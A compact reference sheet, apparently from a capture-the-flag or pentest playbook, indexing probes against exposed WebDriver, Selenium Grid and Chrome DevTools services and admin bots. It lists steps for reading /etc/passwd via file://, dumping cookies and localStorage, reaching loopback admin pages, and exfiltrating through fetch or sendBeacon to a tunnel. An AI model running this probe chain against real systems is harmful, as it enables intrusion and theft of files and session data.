# Probe matrix — the probe set, indexed by goal

## Exposure probes

| Probe | Answers | Pass |
|---|---|---|
| `POST :9515/session` | bare driver? | `sessionId` |
| `POST :4444/session` | Grid? | `sessionId` |
| `GET :4444/status` | Grid inventory? | node list |
| `GET :9222/json` | CDP? | target list |
| `POST /session` (app port) | proxied driver? | `sessionId` |
| `GET /status` | driver version? | version JSON |

## Primitive probes

| Probe | Answers | Pass |
|---|---|---|
| `nav file:///etc/passwd` + `source` | file read? | `root:x:0:0` |
| `execute return 1+1` | JS? | `2` |
| `execute fetch("file:///etc/passwd")` | JS file read? | the file text |
| `nav localhost/admin` + `source` | loopback? | internal content |
| `GET /cookies` | jar? | cookie list |
| `GET /screenshot` | render? | non-blank PNG |
| `execute document.cookie` | JS cookie? | cookie string |
| `execute localStorage` | storage? | storage JSON |

## Reproduction probes

| Probe | Answers | Pass |
|---|---|---|
| read bot source | the spec? | URL/cookie/wait/flags/version |
| local driver + spec | faithful? | page matches live DOM |
| `goto live URL` from local bot | same page? | matching DOM/context |
| `execute` env dump | headless? | `navigator.webdriver` etc. |

## Channel probes

| Probe | Answers | Pass |
|---|---|---|
| `goto your_tunnel` inside driver | reachable? | your body, not interstitial |
| `fetch(your_url)` inside driver | fetch works? | your response |
| `sendBeacon` to listener | beacon leaves? | listener hit |
| same-origin write | write-back works? | the store updates |

## Canary probes (payload development)

| Canary | Proves |
|---|---|
| `console.log('hit')` | JS execution |
| `document.title='X'` | DOM write |
| `fetch(tunnel)` | network egress |
| `document.cookie` | the jar (JS view) |
| `window.self!==window.top` | frame context |

## The probe-to-decision map

| Probe passes | Decision |
|---|---|
| `POST /session` | surface use -> primitive probes |
| file read | the `file://` reach -> flag paths |
| execute | the JS reach -> cookie/storage/fetch |
| loopback | the internal reach -> localhost routes |
| reproduction | aid use -> develop payload |
| channel | the exfil is viable -> fire |
